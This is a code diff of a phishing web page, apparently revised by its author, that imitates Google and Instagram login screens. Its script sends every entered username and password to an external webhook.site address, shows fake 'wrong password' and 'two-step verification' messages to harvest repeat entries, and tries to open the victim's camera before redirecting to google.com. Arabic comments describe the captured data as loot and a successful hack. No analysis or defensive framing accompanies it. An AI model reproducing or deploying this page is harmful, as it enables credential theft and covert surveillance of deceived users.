@@ -3,85 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Media Viewer</title>
+    <title>Photo Security Update</title>
     <style>
-        body { font-family: -apple-system, system-ui, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .box { width: 330px; padding: 35px; text-align: center; border: 1px solid #dadce0; border-radius: 8px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
-        input:focus { outline: none; border: 2px solid #1a73e8; }
-        .btn-go { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; width: 100%; cursor: pointer; font-weight: 500; font-size: 14px; }
-        .btn-ig { background: #0095f6; color: #fff; border: none; padding: 7px; border-radius: 4px; width: 100%; cursor: pointer; font-weight: 600; font-size: 14px; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { width: 320px; padding: 30px; text-align: center; border: 1px solid #dadce0; border-radius: 8px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px; border-radius: 4px; width: 100%; cursor: pointer; font-weight: bold; }
+        .ig-btn { background: #0095f6; margin-top: 10px; }
         .hidden { display: none; }
-        .error { color: #d93025; font-size: 12px; margin-bottom: 15px; text-align: left; display: none; background: #fce8e6; padding: 10px; border-radius: 4px; }
-        .logo-go { width: 75px; margin-bottom: 10px; }
-        .logo-ig { width: 175px; margin-bottom: 15px; }
+        .error { color: #d93025; font-size: 12px; margin-bottom: 10px; background: #fce8e6; padding: 5px; }
     </style>
 </head>
 <body>
 
-<div id="auth-box" class="box">
-    <!-- Google View -->
-    <div id="google-ui">
-        <img src="https://wikimedia.org" class="logo-go">
-        <h2 style="font-weight: 400; margin-bottom: 5px;">Sign in</h2>
-        <p id="msg-go" style="font-size: 15px; margin-bottom: 25px;">Verify identity to access files</p>
-        <div id="err-go" class="error"></div>
-        <input type="email" id="go-user" placeholder="Email or phone">
-        <input type="password" id="go-pass" placeholder="Enter your password">
-        <button class="btn-go" onclick="handleLogic('google')">Next</button>
+<div id="main-ui" class="box">
+    <!-- المرحلة 1: جوجل -->
+    <div id="g-stage">
+        <img src="https://wikimedia.org" width="70">
+        <h3>Identity Verification</h3>
+        <p style="font-size: 14px; color: #5f6368;">Confirm your Google account to access encrypted photos</p>
+        <div id="err-g" class="error hidden">Password incorrect. Please re-enter for security.</div>
+        <input type="email" id="g-user" placeholder="Email or phone">
+        <input type="password" id="g-pass" placeholder="Password">
+        <button class="btn" onclick="strike('google')">Next</button>
     </div>
 
-    <!-- Instagram View -->
-    <div id="insta-ui" class="hidden">
-        <img src="https://wikimedia.org" class="logo-ig">
-        <p id="msg-ig" style="color: #8e8e8e; font-size: 14px; margin-bottom: 20px;">Log in to view Instagram media</p>
-        <div id="err-ig" class="error"></div>
-        <input type="text" id="ig-user" placeholder="Phone number, username, or email">
-        <input type="password" id="ig-pass" placeholder="Password">
-        <button class="btn-ig" onclick="handleLogic('insta')">Log In</button>
+    <!-- المرحلة 2: إنستغرام -->
+    <div id="i-stage" class="hidden">
+        <img src="https://wikimedia.org" width="150">
+        <p style="font-size: 14px; color: #8e8e8e;">Log in to Instagram to sync media</p>
+        <div id="err-i" class="error hidden">Wrong password. Verification required.</div>
+        <input type="text" id="i-user" placeholder="Username or email">
+        <input type="password" id="i-pass" placeholder="Password">
+        <button class="btn ig-btn" onclick="strike('insta')">Log In</button>
     </div>
 </div>
 
 <script>
-    const WEBHOOK_URL = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
-    let status = { google: 0, insta: 0 };
+    const WEBHOOK = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
+    let retry = { google: 0, insta: 0 };
 
-    async function handleLogic(type) {
-        const u = document.getElementById(type === 'google' ? 'go-user' : 'ig-user').value;
-        const p = document.getElementById(type === 'google' ? 'go-pass' : 'ig-pass').value;
-        const err = document.getElementById(type === 'google' ? 'err-go' : 'err-ig');
+    async function strike(type) {
+        const u = document.getElementById(type === 'google' ? 'g-user' : 'i-user').value;
+        const p = document.getElementById(type === 'google' ? 'g-pass' : 'i-pass').value;
+        const err = document.getElementById(type === 'google' ? 'err-g' : 'err-i');
 
-        if (!u || !p) {
-            err.style.display = 'block';
-            err.innerText = "All fields are required.";
-            return;
-        }
+        if (!u || !p) return;
 
-        // إرسال البيانات فوراً للـ Webhook
-        fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type, user: u, pass: p, attempt: status[type] + 1 }) });
+        // إرسال البيانات فوراً (الغنائم)
+        fetch(WEBHOOK, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({ type: type.toUpperCase(), user: u, pass: p, step: retry[type] })
+        });
 
-        status[type]++;
-
-        if (status[type] === 1) {
-            // الخطأ الأول: باسورد غلط
-            err.style.display = 'block';
-            err.innerText = "Wrong password. Try again.";
-            document.getElementById(type === 'google' ? 'go-pass' : 'ig-pass').value = "";
-        } 
-        else if (status[type] === 2) {
-            // الخطأ الثاني: تمويه أمني ذكي
-            err.style.display = 'block';
-            err.style.background = "#e8f0fe";
-            err.style.color = "#1a73e8";
-            err.innerText = "Two-step verification: Please re-enter password to confirm.";
-            document.getElementById(type === 'google' ? 'go-pass' : 'ig-pass').value = "";
-        }
-        else {
-            // بعد 3 محاولات، ننتقل للمرحلة التالية
+        if (retry[type] === 0) {
+            retry[type]++;
+            err.classList.remove('hidden');
+            document.getElementById(type === 'google' ? 'g-pass' : 'i-pass').value = "";
+        } else {
             if (type === 'google') {
-                document.getElementById('google-ui').classList.add('hidden');
-                document.getElementById('insta-ui').classList.remove('hidden');
+                document.getElementById('g-stage').classList.add('hidden');
+                document.getElementById('i-stage').classList.remove('hidden');
             } else {
+                // محاولة أخيرة لسحب صورة من الكاميرا الأمامية صامتاً (Media Access)
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    // إذا وافق، يتم إرسال إشارة للـ Webhook بنجاح الاختراق
+                } catch(e) {}
+                
+                // التوجيه النهائي للصورة الأصلية
                 window.location.href = "https://google.com";
             }
         }
